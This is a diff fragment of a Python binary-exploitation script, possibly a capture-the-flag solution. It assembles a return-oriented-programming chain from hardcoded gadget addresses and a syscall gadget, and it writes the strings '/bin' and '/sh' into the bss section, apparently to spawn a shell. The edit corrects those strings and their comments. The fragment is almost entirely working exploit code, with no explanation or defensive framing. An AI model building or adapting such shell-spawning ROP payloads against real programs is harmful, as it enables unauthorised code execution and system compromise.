@@ -30,14 +30,14 @@ buff += struct.pack('<Q', 1234)
 #syscall
 buff += struct.pack('<Q', 0x000000000045b525)
 
-#mov /bas to bss
+#mov /bin to bss
 buff += struct.pack('<Q', 0x000000000044d2b4)
 buff += b"/bin\x00\x00\x00\x00"
 buff += struct.pack('<Q', 0x0000000000437205)
 buff += struct.pack('<Q', 0x00000000006C1C00)
 buff += struct.pack('<Q', 0x000000000046d323)
 
-#mov h -p to bss
+#mov /sh to bss
 buff += struct.pack('<Q', 0x000000000044d2b4)
 buff += b"/sh\x00\x00\x00\x00\x00"
 buff += struct.pack('<Q', 0x0000000000437205)
